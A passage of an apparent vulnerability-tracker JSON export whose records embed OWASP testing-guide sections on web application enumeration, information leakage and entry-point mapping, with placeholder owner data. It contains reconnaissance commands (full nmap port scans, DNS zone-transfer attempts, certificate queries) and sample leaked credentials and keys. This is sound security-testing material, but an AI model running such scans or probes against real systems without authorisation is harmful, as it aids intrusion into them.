Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/04-Enumerate_Applications_on_Webserver","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nA paramount step in testing for web application vulnerabilities is to find out which particular applications are hosted on a web server. Many applications have known vulnerabilities and known attack strategies that can be exploited in order to gain remote control or to exploit data. In addition, many applications are often misconfigured or not updated, due to the perception that they are only used \u201Cinternally\u201D and therefore no threat exists. With the proliferation of virtual web servers, the traditional 1:1-type relationship between an IP address and a web server is losing much of its original significance. It is not uncommon to have multiple sites or applications whose symbolic names resolve to the same IP address. This scenario is not limited to hosting environments, but also applies to ordinary corporate environments as well.\nSecurity professionals are sometimes given a set of IP addresses as a target to test. It is arguable that this scenario is more akin to a penetration test-type engagement, but in any case it is expected that such an assignment would test all web applications accessible through this target. The problem is that the given IP address hosts an HTTP service on port 80, but if a tester should access it by specifying the IP address (which is all they know) it reports \u201CNo web server configured at this address\u201D or a similar message. But that system could \u201Chide\u201D a number of web applications, associated to unrelated symbolic (DNS) names. Obviously, the extent of the analysis is deeply affected depending on whether the tester tests all the applications or only tests the applications that they are aware of.\nSometimes, the target specification is richer. The tester may be given a list of IP addresses and their corresponding symbolic names. Nevertheless, this list might convey partial information, i.e., it could omit some symbolic names and the client may not even be aware of that (this is more likely to happen in large organizations).\nOther issues affecting the scope of the assessment are represented by web applications published at non-obvious URLs (e.g., \u0060http://www.example.com/some-strange-URL\u0060), which are not referenced elsewhere. This may happen either by error (due to misconfigurations), or intentionally (for example, unadvertised administrative interfaces).\nTo address these issues, it is necessary to perform web application discovery.","TestingInstructions":"## Test Objectives\n\n* Enumerate the applications within the scope that exist on a web server.\n\n## How to Test\n\nWeb application discovery is a process that aims to identify web applications on a given infrastructure. The latter is usually specified as a set of IP addresses (maybe a net block), but may consist of a set of DNS symbolic names or a mix of the two. This information is handed out prior to the execution of an assessment, be it a classic-style penetration test or an application-focused assessment. In both cases, unless the rules of engagement specify otherwise (e.g., test only the application located at the URL \u0060http://www.example.com/\u0060), the assessment should strive to be the most comprehensive in scope, i.e. it should identify all the applications accessible through the given target. The following examples examine a few techniques that can be employed to achieve this goal.\n\n\u003E Some of the following techniques apply to Internet-facing web servers, namely DNS and reverse-IP web-based search services and the use of search engines. Examples make use of private IP addresses (such as \u0060192.168.1.100\u0060), which, unless indicated otherwise, represent *generic* IP addresses and are used only for anonymity purposes.\n\nThere are three factors influencing how many applications are related to a given DNS name (or an IP address):\n\n1. **Different Base URL**\n    The obvious entry point for a web application is \u0060www.example.com\u0060, i.e., with this shorthand notation we think of the web application originating at \u0060http://www.example.com/\u0060 (the same applies for HTTPS). However, even though this is the most common situation, there is nothing forcing the application to start at \u0060/\u0060.\n    For example, the same symbolic name may be associated to three web applications such as: \u0060http://www.example.com/app1\u0060 \u0060http://www.example.com/app2\u0060 \u0060http://www.example.com/app3\u0060\n    In this case, the URL \u0060http://www.example.com/\u0060 would not be associated with a meaningful page. The three applications would remain **hidden** unless the tester explicitly knows how to access them, i.e., the tester knows *app1*, *app2* or *app3*. There is usually no need to publish web applications in this way, unless the owner doesn\u2019t want them to be accessible in a standard way, and is prepared to inform the users about their exact location. This doesn\u2019t mean that these applications are secret, just that their existence and location is not explicitly advertised.\n2. **Non-standard Ports**\n    While web applications usually live on port 80 (HTTP) and 443 (HTTPS), there is nothing fixed or mandatory about these port numbers. In fact, web applications may be associated with arbitrary TCP ports, and can be referenced by specifying the port number as follows: \u0060http[s]://www.example.com:port/\u0060. For example, \u0060http://www.example.com:20000/\u0060.\n3. **Virtual Hosts**\n    DNS allows a single IP address to be associated with one or more symbolic names. For example, the IP address \u0060192.168.1.100\u0060 might be associated to DNS names \u0060www.example.com\u0060, \u0060helpdesk.example.com\u0060, \u0060webmail.example.com\u0060. It is not necessary that all the names belong to the same DNS domain. This 1-to-N relationship may be reflected to serve different content by using so called virtual hosts. The information specifying the virtual host we are referring to is embedded in the HTTP 1.1 [Host header](https://tools.ietf.org/html/rfc2616#section-14.23).\n    One would not suspect the existence of other web applications in addition to the obvious \u0060www.example.com\u0060, unless they know of \u0060helpdesk.example.com\u0060 and \u0060webmail.example.com\u0060.\n\n### Approaches to Address Issue 1 - Non-standard URLs\n\nThere is no way to fully ascertain the existence of non-standard-named web applications. Being non-standard, there are no fixed criteria governing the naming convention, however there are a number of techniques that the tester can use to gain some additional insight.\nFirst, if the web server is mis-configured and allows directory browsing, it may be possible to spot these applications. Vulnerability scanners may help in this respect.\nSecond, these applications may be referenced by other web pages and there is a chance that they have been spidered and indexed by web search engines. If testers suspect the existence of such **hidden** applications on \u0060www.example.com\u0060 they could search using the *site* operator and examining the result of a query for \u0060site: www.example.com\u0060. Among the returned URLs there could be one pointing to such a non-obvious application.\nAnother option is to probe for URLs which might be likely candidates for non-published applications. For example, a web mail frontend might be accessible from URLs such as \u0060https://www.example.com/webmail\u0060, \u0060https://webmail.example.com/\u0060, or \u0060https://mail.example.com/\u0060. The same holds for administrative interfaces, which may be published at hidden URLs (for example, a Tomcat administrative interface), and yet not referenced anywhere. So doing a bit of dictionary-style searching (or \u201Cintelligent guessing\u201D) could yield some results. Vulnerability scanners may help in this respect.\n\n### Approaches to Address Issue 2 - Non-standard Ports\n\nIt is easy to check for the existence of web applications on non-standard ports. A port scanner such as Nmap is capable of performing service recognition by means of the \u0060-sV\u0060 option, and will identify http[s] services on arbitrary ports. What is required is a full scan of the whole 64k TCP port address space.\nFor example, the following command will look up, with a TCP connect scan, all the open ports on IP \u0060192.168.1.100\u0060 and will try to determine what services are bound to them (only *essential* switches are shown \u2013 Nmap features a broad set of options, whose discussion is out of scope):\n\u0060nmap \u2013Pn \u2013sT \u2013sV \u2013p0-65535 192.168.1.100\u0060\nIt is sufficient to examine the output and look for HTTP or the indication of TLS-wrapped services (which should be probed to confirm that they are HTTPS). For example, the output of the previous command could look like:\n\n\u0060\u0060\u0060\nInteresting ports on 192.168.1.100:\n(The 65527 ports scanned but not shown below are in state: closed)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 3.5p1 (protocol 1.99)\n80/tcp    open  http        Apache httpd 2.0.40 ((Red Hat Linux))\n443/tcp   open  ssl         OpenSSL\n901/tcp   open  http        Samba SWAT administration server\n1241/tcp  open  ssl         Nessus security scanner\n3690/tcp  open  unknown\n8000/tcp  open  http-alt?\n8080/tcp  open  http        Apache Tomcat/Coyote JSP engine 1.1\n\u0060\u0060\u0060\n\nFrom this example, one can see that:\n\n* There is an Apache HTTP server running on port 80.\n* It looks like there is an HTTPS server on port 443 (but this needs to be confirmed, for example, by visiting \u0060https://192.168.1.100\u0060 with a browser).\n* On port 901 there is a Samba SWAT web interface.\n* The service on port 1241 is not HTTPS, but is the TLS-wrapped Nessus daemon.\n* Port 3690 features an unspecified service (Nmap gives back its *fingerprint* \\- here omitted for clarity \\- together with instructions to submit it for incorporation in the Nmap fingerprint database\\, provided you know which service it represents\\)\\.\n* Another unspecified service on port 8000; this might possibly be HTTP, since it is not uncommon to find HTTP servers on this port. Let\u2019s examine this issue:\n\n\u0060\u0060\u0060\n$ telnet 192.168.10.100 8000\nTrying 192.168.1.100...\nConnected to 192.168.1.100.\nEscape character is \u0027^]\u0027.\nGET / HTTP/1.0\n\nHTTP/1.0 200 OK\npragma: no-cache\nContent-Type: text/html\nServer: MX4J-HTTPD/1.0\nexpires: now\nCache-Control: no-cache\n\n\u003Chtml\u003E\n...\n\u0060\u0060\u0060\n\nThis confirms that in fact it is an HTTP server. Alternatively, testers could have visited the URL with a web browser; or used the GET or HEAD Perl commands, which mimic HTTP interactions such as the one given above (however HEAD requests may not be honored by all servers).\n\n* Apache Tomcat running on port 8080.\n\nThe same task may be performed by vulnerability scanners, but first check that the scanner of choice is able to identify HTTP[S] services running on non-standard ports. For example, Nessus is capable of identifying them on arbitrary ports (provided it is instructed to scan all the ports), and will provide, with respect to Nmap, a number of tests on known web server vulnerabilities, as well as on the TLS/SSL configuration of HTTPS services. As hinted before, Nessus is also able to spot popular applications or web interfaces which could otherwise go unnoticed (for example, a Tomcat administrative interface).\n\n### Approaches to Address Issue 3 - Virtual Hosts\n\nThere are a number of techniques which may be used to identify DNS names associated to a given IP address \u0060x.y.z.t\u0060.\n\n#### DNS Zone Transfers\n\nThis technique has limited use nowadays, given the fact that zone transfers are largely not honored by DNS servers. However, it could still be worth attempting. First of all, testers must determine the name servers serving \u0060x.y.z.t\u0060. If a symbolic name is known for \u0060x.y.z.t\u0060 (let it be \u0060www.example.com\u0060), its name servers can be determined by means of tools such as \u0060nslookup\u0060, \u0060host\u0060, or \u0060dig\u0060, by requesting DNS NS records.\nIf no symbolic names are known for \u0060x.y.z.t\u0060, but the target definition contains at least a symbolic name, testers may try to apply the same process and query the name server of that name (hoping that \u0060x.y.z.t\u0060 will be served as well by that name server). For example, if the target consists of the IP address \u0060x.y.z.t\u0060 and the name \u0060mail.example.com\u0060, determine the name servers for domain \u0060example.com\u0060.\nThe following example shows how to identify the name servers for \u0060www.owasp.org\u0060 by using the \u0060host\u0060 command:\n\n\u0060\u0060\u0060\n$ host -t ns www.owasp.org\nwww.owasp.org is an alias for owasp.org.\nowasp.org name server ns1.secure.net.\nowasp.org name server ns2.secure.net.\n\u0060\u0060\u0060\n\nA zone transfer can now be requested to the name servers for the domain \u0060example.com\u0060. If the tester is fortunate, they may receive a list of the DNS entries for this domain in response. This will include the obvious \u0060www.example.com\u0060 and the not-so-obvious \u0060helpdesk.example.com\u0060 and \u0060webmail.example.com\u0060 (and possibly others). Check all the names returned by the zone transfer and consider all of those which are related to the target being evaluated.\nTrying to request a zone transfer for \u0060owasp.org\u0060 from one of its name servers:\n\n\u0060\u0060\u0060\n$ host -l www.owasp.org ns1.secure.net\nUsing domain server:\nName: ns1.secure.net\nAddress: 192.220.124.10#53\nAliases:\n\nHost www.owasp.org not found: 5(REFUSED)\n; Transfer failed.\n\u0060\u0060\u0060\n\n#### DNS Inverse Queries\n\nThis process is similar to the previous one, but relies on inverse (PTR) DNS records. Rather than requesting a zone transfer, try setting the record type to PTR and issue a query on the given IP address. If the testers are fortunate, they may receive a DNS name entry in response. This technique relies on the existence of IP-to-symbolic name maps, which is not guaranteed.\n\n#### Web-based DNS Searches\n\nThis kind of search is akin to DNS zone transfer, but relies on web-based services that enable name-based searches on DNS. One such service is the [Netcraft Search DNS](https://searchdns.netcraft.com/?host) service. The tester may query for a list of names belonging to your domain of choice, such as \u0060example.com\u0060. They will then check whether the names they obtained are pertinent to the target they are examining.\n\n#### Reverse-IP Services\n\nReverse-IP services are similar to DNS inverse queries, with the difference that the testers query a web-based application instead of a name server. There are a number of such services available. Since they tend to return partial (and often different) results, it is better to use multiple services to obtain a more comprehensive analysis.\n\n* [MxToolbox Reverse IP](https://mxtoolbox.com/ReverseLookup.aspx)\n* [DNSstuff](https://www.dnsstuff.com/) (multiple services available)\n* [Net Square](https://web.archive.org/web/20190515092354/http://www.net-square.com/mspawn.html) (multiple queries on domains and IP addresses, requires installation)\n\n#### Googling\n\nFollowing information gathering from the previous techniques, testers can rely on search engines to possibly refine and increment their analysis. This may yield evidence of additional symbolic names belonging to the target, or applications accessible via non-obvious URLs.\nFor instance, considering the previous example regarding \u0060www.owasp.org\u0060, the tester could query Google and other search engines looking for information (hence, DNS names) related to the newly discovered domains of \u0060webgoat.org\u0060, \u0060webscarab.com\u0060, and \u0060webscarab.net\u0060.\nGoogling techniques are explained in [Testing: Spiders, Robots, and Crawlers](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/01-Conduct_Search_Engine_Discovery_Reconnaissance_for_Information_Leakage).\n\n#### Digital Certificates\n\nIf the server accepts connections over HTTPS, then the Common Name (CN) and Subject Alternate Name (SAN) on the certificate may contain one or more hostnames. However, if the webserver does not have a trusted certificate, or wildcards are in use, this may not return any valid information.\nThe CN and SAN can be obtained by manually inspecting the certificate, or through other tools such as OpenSSL:\n\n\u0060\u0060\u0060\nopenssl s_client -connect 93.184.216.34:443 \u003C/dev/null 2\u003E/dev/null | openssl x509 -noout -text | grep -E \u0027DNS:|Subject:\u0027\n\nSubject: C = US, ST = California, L = Los Angeles, O = Internet Corporation for Assigned Names and Numbers, CN = www.example.org\nDNS:www.example.org, DNS:example.com, DNS:example.edu, DNS:example.net, DNS:example.org, DNS:www.example.com, DNS:www.example.edu, DNS:www.example.net\n\u0060\u0060\u0060\n\n## Tools\n\n* DNS lookup tools such as \u0060nslookup\u0060, \u0060dig\u0060 and similar.\n* Search engines (Google, Bing, and other major search engines).\n* Specialized DNS-related web-based search service: see text.\n* [Nmap](https://nmap.org/)\n* [Nessus Vulnerability Scanner](https://www.tenable.com/products/nessus)\n* [Nikto](https://www.cirt.net/nikto2)","Details":null,"Implication":null,"Recommendation":null,"References":null,"Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-05 Review Web Page Content for Information Leakage","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/05-Review_Web_Page_Content_for_Information_Leakage","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":"Review Web Page Content for Information Leakage","Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nIt is very common, and even recommended, for programmers to include detailed comments and metadata on their source code. However, comments and metadata included in the HTML code might reveal internal information that should not be available to potential attackers. Comments and metadata review should be done in order to determine if any information is being leaked. Additionally some applications may leak information in the body of redirect responses.\nFor modern web apps, the use of client-side JavaScript for the frontend is becoming more popular. Popular frontend construction technologies use client-side JavaScript like ReactJS, AngularJS, or Vue. Similar to the comments and metadata in HTML code, many programmers also hardcode sensitive information in JavaScript variables on the frontend. Sensitive information can include (but is not limited to): Private API Keys (*e.g.* an unrestricted Google Map API Key), internal IP addresses, sensitive routes (*e.g.* route to hidden admin pages or functionality), or even credentials. This sensitive information can be leaked from such frontend JavaScript code. A review should be done in order to determine if any sensitive information leaked which could be used by attackers for abuse.\nFor large web applications, performance issues are a big concern to programmers. Programmers have used different methods to optimize frontend performance, including Syntactically Awesome Style Sheets (Sass), Sassy CSS (SCSS), webpack, etc. Using these technologies, frontend code will sometimes become harder to understand and difficult to debug, and because of it, programmers often deploy source map files for debugging purposes. A \u201Csource map\u201D is a special file that connects a minified/uglified version of an asset (CSS or JavaScript) to the original authored version. Programmers are still debating whether or not to bring source map files to the production environment. However, it is undeniable that source map files or files for debugging if released to the production environment will make their source more human-readable. It can make it easier for attackers to find vulnerabilities from the frontend or collect sensitive information from it. JavaScript code review should be done in order to determine if any debug files are exposed from the frontend. Depending on the context and sensitivity of the project, a security expert should decide whether the files should exist in the production environment or not.","TestingInstructions":"## Test Objectives\n\n* Review web page comments, metadata, and redirect bodies to find any information leakage.\n* Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.\n* Identify if source map files or other frontend debug files exist.\n\n## How to Test\n\n### Review Web Page Comments and Metadata\n\nHTML comments are often used by the developers to include debugging information about the application. Sometimes, they forget about the comments and they leave them in production environments. Testers should look for HTML comments which start with \u0060\u003C!--\u0060.\nCheck HTML source code for comments containing sensitive information that can help the attacker gain more insight about the application. It might be SQL code, usernames and passwords, internal IP addresses, or debugging information.\n\n\u0060\u0060\u0060\n...\n\u003Cdiv class=\u0022table2\u0022\u003E\n  \u003Cdiv class=\u0022col1\u0022\u003E1\u003C/div\u003E\u003Cdiv class=\u0022col2\u0022\u003EMary\u003C/div\u003E\n  \u003Cdiv class=\u0022col1\u0022\u003E2\u003C/div\u003E\u003Cdiv class=\u0022col2\u0022\u003EPeter\u003C/div\u003E\n  \u003Cdiv class=\u0022col1\u0022\u003E3\u003C/div\u003E\u003Cdiv class=\u0022col2\u0022\u003EJoe\u003C/div\u003E\n\n\u003C!-- Query: SELECT id, name FROM app.users WHERE active=\u00271\u0027 --\u003E\n\n\u003C/div\u003E\n...\n\u0060\u0060\u0060\n\nThe tester may even find something like this:\n\n\u0060\u0060\u0060\n\u003C!-- Use the DB administrator password for testing:  f@keP@a$$w0rD --\u003E\n\u0060\u0060\u0060\n\nCheck HTML version information for valid version numbers and Data Type Definition (DTD) URLs\n\n\u0060\u0060\u0060\n\u003C!DOCTYPE HTML PUBLIC \u0022-//W3C//DTD HTML 4.01//EN\u0022 \u0022http://www.w3.org/TR/html4/strict.dtd\u0022\u003E\n\u0060\u0060\u0060\n\n* \u0060strict.dtd\u0060 \u2013 default strict DTD\n* \u0060loose.dtd\u0060 \u2013 loose DTD\n* \u0060frameset.dtd\u0060 \u2013 DTD for frameset documents\n\nSome \u0060META\u0060 tags do not provide active attack vectors but instead allow an attacker to profile an application:\n\n\u0060\u0060\u0060\n\u003CMETA name=\u0022Author\u0022 content=\u0022Andrew Muller\u0022\u003E\n\u0060\u0060\u0060\n\nA common (but not [WCAG](https://www.w3.org/WAI/standards-guidelines/wcag/) compliant) \u0060META\u0060 tag is [Refresh](https://en.wikipedia.org/wiki/Meta_refresh).\n\n\u0060\u0060\u0060\n\u003CMETA http-equiv=\u0022Refresh\u0022 content=\u002215;URL=https://www.owasp.org/index.html\u0022\u003E\n\u0060\u0060\u0060\n\nA common use for \u0060META\u0060 tag is to specify keywords that a search engine may use to improve the quality of search results.\n\n\u0060\u0060\u0060\n\u003CMETA name=\u0022keywords\u0022 lang=\u0022en-us\u0022 content=\u0022OWASP, security, sunshine, lollipops\u0022\u003E\n\u0060\u0060\u0060\n\nAlthough most web servers manage search engine indexing via the \u0060robots.txt\u0060 file, it can also be managed by \u0060META\u0060 tags. The tag below will advise robots to not index and not follow links on the HTML page containing the tag.\n\n\u0060\u0060\u0060\n\u003CMETA name=\u0022robots\u0022 content=\u0022none\u0022\u003E\n\u0060\u0060\u0060\n\nThe [Platform for Internet Content Selection (PICS)](https://www.w3.org/PICS/) and [Protocol for Web Description Resources (POWDER)](https://www.w3.org/2007/powder/) provide infrastructure for associating metadata with Internet content.\n\n### Identifying JavaScript Code and Gathering JavaScript Files\n\nProgrammers often hardcode sensitive information with JavaScript variables on the frontend. Testers should check HTML source code and look for JavaScript code between \u0060\u003Cscript\u003E\u0060 and \u0060\u003C/script\u003E\u0060 tags. Testers should also identify external JavaScript files to review the code (JavaScript files have the file extension \u0060.js\u0060 and name of the JavaScript file usually put in the \u0060src\u0060 (source) attribute of a \u0060\u003Cscript\u003E\u0060 tag).\nCheck JavaScript code for any sensitive information leaks which could be used by attackers to further abuse or manipulate the system. Look for values such as: API keys, internal IP addresses, sensitive routes, or credentials. For example:\n\n\u0060\u0060\u0060\nconst myS3Credentials = {\n  accessKeyId: config(\u0027AWSS3AccessKeyID\u0027),\n  secretAccessKey: config(\u0027AWSS3SecretAccessKey\u0027),\n};\n\u0060\u0060\u0060\n\nThe tester may even find something like this:\n\n\u0060\u0060\u0060\nvar conString = \u0022tcp://postgres:1234@localhost/postgres\u0022;\n\u0060\u0060\u0060\n\nWhen an API Key is found, testers can check if the API Key restrictions are set per service or by IP, HTTP referrer, application, SDK, etc.\nFor example, if testers find a Google Map API Key, they can check if this API Key is restricted by IP or restricted only per the Google Map APIs. If the Google API Key is restricted only per the Google Map APIs, attackers can still use that API Key to query unrestricted Google Map APIs and the application owner must pay for that.\n\n\u0060\u0060\u0060\n\n\u003Cscript type=\u0022application/json\u0022\u003E\n...\n{\u0022GOOGLE_MAP_API_KEY\u0022:\u0022AIzaSyDUEBnKgwiqMNpDplT6ozE4Z0XxuAbqDi4\u0022, \u0022RECAPTCHA_KEY\u0022:\u00226LcPscEUiAAAAHOwwM3fGvIx9rsPYUq62uRhGjJ0\u0022}\n...\n\u003C/script\u003E\n\u0060\u0060\u0060\n\nIn some cases, testers may find sensitive routes from JavaScript code, such as links to internal or hidden admin pages.\n\n\u0060\u0060\u0060\n\u003Cscript type=\u0022application/json\u0022\u003E\n...\n\u0022runtimeConfig\u0022:{\u0022BASE_URL_VOUCHER_API\u0022:\u0022https://staging-voucher.victim.net/api\u0022, \u0022BASE_BACKOFFICE_API\u0022:\u0022https://10.10.10.2/api\u0022, \u0022ADMIN_PAGE\u0022:\u0022/hidden_administrator\u0022}\n...\n\u003C/script\u003E\n\u0060\u0060\u0060\n\n### Identifying Source Map Files\n\nSource map files will usually be loaded when DevTools open. Testers can also find source map files by adding the \u201C.map\u201D extension after the extension of each external JavaScript file. For example, if a tester sees a \u0060/static/js/main.chunk.js\u0060 file, they can then check for its source map file by visiting \u0060/static/js/main.chunk.js.map\u0060.\nCheck source map files for any sensitive information that can help the attacker gain more insight about the application. For example:\n\n\u0060\u0060\u0060\n{\n  \u0022version\u0022: 3,\n  \u0022file\u0022: \u0022static/js/main.chunk.js\u0022,\n  \u0022sources\u0022: [\n    \u0022/home/sysadmin/cashsystem/src/actions/index.js\u0022,\n    \u0022/home/sysadmin/cashsystem/src/actions/reportAction.js\u0022,\n    \u0022/home/sysadmin/cashsystem/src/actions/cashoutAction.js\u0022,\n    \u0022/home/sysadmin/cashsystem/src/actions/userAction.js\u0022,\n    \u0022...\u0022\n  ],\n  \u0022...\u0022\n}\n\u0060\u0060\u0060\n\nWhen sites load source map files, the frontend source code will become readable and easier to debug.\n\n### Identify Redirect Responses which Leak Information\n\nAlthough redirect responses are not generally expected to contain any significant web content there is no assurance that they cannot contain content. So, while series 300 (redirect) responses often contain \u201Credirecting to \u0060https://example.com/\u0060\u201D type content they may also leak content.\nConsider a situation in which a redirect response is the result of an authentication or authorization check, if that check fails the server may respond redirecting the user back to a \u201Csafe\u201D or \u201Cdefault\u201D page, yet the redirect response itself may still contain content which isn\u2019t shown in the browser but is indeed transmitted to the client. This can be seen either leveraging browser developer tools or via a personal proxy (such as ZAP, Burp, Fiddler, or Charles).\n\n## Tools\n\n* [Wget](https://www.gnu.org/software/wget/wget.html)\n* Browser \u201Cview source\u201D function\n* Eyeballs\n* [Curl](https://curl.haxx.se/)\n* [Zed Attack Proxy (ZAP)](https://www.zaproxy.org/)\n* [Burp Suite](https://portswigger.net/burp)\n* [Waybackurls](https://github.com/tomnomnom/waybackurls)\n* [Google Maps API Scanner](https://github.com/ozguralp/gmapsapiscanner/)","Details":null,"Implication":null,"Recommendation":null,"References":"## References\n\n* [KeyHacks](https://github.com/streaak/keyhacks)\n* [RingZer0 Online CTF](https://ringzer0ctf.com/challenges/104) \\- Challenge 104 \u201CAdmin Panel\u201D\\.\n\n### Whitepapers\n\n* [HTML version 4.01](https://www.w3.org/TR/1999/REC-html401-19991224)\n* [XHTML](https://www.w3.org/TR/2010/REC-xhtml-basic-20101123/)\n* [HTML version 5](https://www.w3.org/TR/html5/)","Reference":null,"Vendor":"OWASP","Product":"OWASP","Base":0,"Environmental":0,"Temporal":0,"ScoreVersion":null,"Attributes":{"tested_by":"Anonymous","comments":"","logged_in":"SaltMiner","influencers":"[]","approvers":"Grace Hopper","risk":"10","fix_by":"6/12/2024","hours_to_find":"1","developer_note":""}},"Asset":{"AppVersion":"3.0.1","Name":"01-Information Gathering","Description":"01-Information Gathering","VersionId":"1","Version":"1","Host":null,"Ip":null,"Scheme":null,"Port":0,"SourceId":"be1d5a82-3e46-4f01-9b67-4f016b156e85","Attributes":{"physical_address":"555 Somewhere Dr\nAnywhere, CA 55555","last_deployed":"6/12/2024","owner":"Grace Hopper","dev_team":"[\u0022Johann Gutenberg\u0022]","up_days":"10","business_unit":"Testing Methodology","budget":"10000"}}},{"Issue":{"AppVersion":"3.0.1","Name":"WSTG-INFO-06 Identify Application Entry Points","Severity":"High","FoundDate":"2024-06-12T00:00:00","TestStatus":"Not Tested","IsSuppressed":false,"IsFiltered":false,"RemovedDate":null,"Location":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points","LocationFull":"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points","ReportId":"39f792bf-9347-41d0-a444-d009ba0c8bf2","Category":["Application"],"Classification":null,"Description":null,"Audited":false,"Auditor":null,"LastAudit":null,"Enumeration":null,"Proof":"## Summary\n\nEnumerating the application and its attack surface is a key precursor before any thorough testing can be undertaken, as it allows the tester to identify likely areas of weakness. This section aims to help identify and map out areas within the application that should be investigated once enumeration and mapping have been completed.\n\n\u003Cbr\u003E\n","TestingInstructions":"## Test Objectives\n\n* Identify possible entry and injection points through request and response analysis.\n\n## How to Test\n\nBefore any testing begins, the tester should always get a good understanding of the application and how the user and browser communicates with it. As the tester walks through the application, they should pay attention to all HTTP requests as well as every parameter and form field that is passed to the application. They should pay special attention to when GET requests are used and when POST requests are used to pass parameters to the application. In addition, they also need to pay attention to when other methods for RESTful services are used.\nNote that in order to see the parameters sent in the body of requests such as a POST request, the tester may want to use a tool such as an intercepting proxy (see [tools](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points#tools)). Within the POST request, the tester should also make special note of any hidden form fields that are being passed to the application, as these usually contain sensitive information such as state information, quantity of items, the price of items, etc., that the developer never intended for anyone to see or change.\nThe usage of an intercepting proxy and a note taking application (for example, a spreadsheet software) for this stage of testing is popular among testers. The proxy will keep track of every request and response between the tester and the application as they explore it. Additionally, at this point, testers usually trap every request and response so that they can see exactly every header, parameter, etc. that is being passed to the application and what is being returned. This can be quite tedious at times, especially on large interactive sites (think of a banking application). However, experience will show what to look for and this phase can be significantly optimized.\nAs the tester walks through the application, they should take note of any interesting parameters in the URL, custom headers, or body of the requests/responses, and save them in a spreadsheet. The spreadsheet should include the page requested (it might be good to also add the request number from the proxy, for future reference), the interesting parameters, the type of request (GET, POST, etc.), if access is authenticated/unauthenticated, if TLS is used, if it\u2019s part of a multi-step process, if WebSockets are used, and any other relevant notes. Once they have every area of the application mapped out, they can then go through the application and test each of the areas that they have identified and make notes for what worked and what didn\u2019t work. The rest of this guide will identify how to test each of these areas of interest, but this section must be undertaken before any of the actual testing can commence.\nBelow are some points of interests for all requests and responses. Within the requests section, focus on the GET and POST methods as these comprise majority of the requests. Note that other methods, such as PUT and DELETE can also be found. Often, such rarer requests, if allowed, can expose vulnerabilities. There is a special section in this guide dedicated for testing these HTTP methods.\n\n### Requests\n\n* Identify where GETs are used and where POSTs are used.\n* Identify all the parameters used in a POST request (these are in the body of the request).\n* Within the POST request, pay special attention to any hidden parameters. When a POST is sent, all the form fields (including hidden parameters) will be sent in the body of the HTTP message to the application. These typically aren\u2019t seen unless a proxy is used, or the HTML source code is viewed. Altering these hidden parameters may result in changes to the following pages that load, the data they contain, and the degree of access granted.\n* Identify all the parameters used in a GET request (i.e., in the URL), particularly the query string (usually appearing after a ? mark).\n* Identify all the parameters of the query string. These usually are in a pair format, such as \u0060foo=bar\u0060. Also note that many parameters can be in one query string separated by a \u0060\u0026\u0060, \u0060\\~\u0060, \u0060:\u0060, or any other special character or encoding.\n* Please note, when identifying multiple parameters in one string or within a POST request, some or all of the parameters will be required to execute the attacks. The tester needs to identify all of the parameters (even if they are encoded or encrypted) and identify which ones are processed by the application. Later sections of the guide will cover how to test these parameters. At this point, it is important to make sure that each one of them is identified.\n* Also pay attention to any additional or custom type headers not typically seen (such as \u0060debug: false\u0060).\n\n### Responses\n\n* Identify where new cookies are set (\u0060Set-Cookie\u0060 header), modified, or added to.\n* Identify any redirects (3xx HTTP status code), 400 status codes (particularly 403 Forbidden), and 500 internal server errors during normal responses (i.e., unmodified requests).\n* Also note where any interesting headers are used. For example, \u0060Server: BIG-IP\u0060 indicates that the site is load balanced. Thus, if a site is load balanced and one server is incorrectly configured, then the tester might have to make multiple requests to access the vulnerable server, depending on the type of load balancing used.\n\n### OWASP Attack Surface Detector\n\nThe Attack Surface Detector (ASD) tool investigates the source code and uncovers the endpoints of a web application, the parameters these endpoints accept, and the data type of those parameters. This includes unlinked endpoints that a spider wouldn\u2019t be able to find, as well as optional parameters that are completely unused in the client-side code. It also has the capability to calculate the changes in attack surface between two versions of an application.\nThe Attack Surface Detector is available as a plugin to both ZAP and Burp Suite, and a command-line tool is also available. The command-line tool exports the attack surface as a JSON output, which can then be used by the ZAP and Burp Suite plugin. This is helpful for cases where the source code is not provided to the penetration tester directly. For example, the penetration tester can get the json output file from a customer who does not want to 